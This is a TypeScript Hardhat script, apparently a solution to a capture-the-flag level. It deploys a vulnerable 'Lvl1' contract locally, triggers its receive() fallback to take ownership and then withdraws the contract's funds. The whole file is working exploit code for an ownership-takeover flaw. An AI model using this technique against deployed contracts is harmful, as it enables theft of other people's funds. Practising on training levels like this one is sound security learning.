import { ethers } from "hardhat";
import { Lvl1 } from "../../typechain";

/**
 * The vulnerability in level 1 lies in the fallback function (receive()).
 * 
 * If the sender has contributed before, he can send funds to the contract, trigger the fallback function and become the new owner.
 */
async function main() {
  const accounts = await ethers.getSigners();
  const ownAddress = accounts[1].address;
  const provider = ethers.provider;

  const contractFactory = await ethers.getContractFactory("Lvl1");
  console.log("Deploying contract...");
  const contract = (await contractFactory.deploy()) as Lvl1;
  console.log("Awaiting confirmations...");
  await contract.deployed();
  console.log(`Contract deployed locally at ${contract.address}`);
  const contractAccountOneConnected = await contract.connect(accounts[1]);

  console.log("Contributing to meet requirement for exploit...");
  const beforeContributions =
    await contractAccountOneConnected.getContribution();
  console.log(
    `Wallet ${ownAddress} had ${ethers.utils.formatEther(
      beforeContributions
    )} contributions before.`
  );

  const contributeTx = await contractAccountOneConnected.contribute({
    value: ethers.utils.parseEther("0.0001"),
  });
  await contributeTx.wait();

  const afterContributions =
    await contractAccountOneConnected.getContribution();
  console.log(
    `Wallet ${ownAddress} has now ${ethers.utils.formatEther(
      afterContributions
    )} contributions.`
  );

  const prevContractBalance = await provider.getBalance(contract.address);
  console.log(
    `Previous contract balance : ${ethers.utils.formatEther(
      prevContractBalance
    )} ETH.`
  );
  const prevOwner = await contractAccountOneConnected.owner();
  console.log(`Previous owner : ${prevOwner}`);

  console.log("Requirements for exploit are met. Exploiting...");
  const transferTx = await accounts[1].sendTransaction({
    to: contract.address,
    value: ethers.utils.parseEther("0.0001"),
  });
  await transferTx.wait();

  const newOwner = await contractAccountOneConnected.owner();
  console.log(`New owner : ${newOwner}`);

  console.log("Withdrawing funds...");
  const withdrawTx = await contractAccountOneConnected.withdraw();
  await withdrawTx.wait();

  const newContractBalance = await provider.getBalance(contract.address);
  console.log(
    `New contract balance : ${ethers.utils.formatEther(newContractBalance)} ETH.`
  );
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
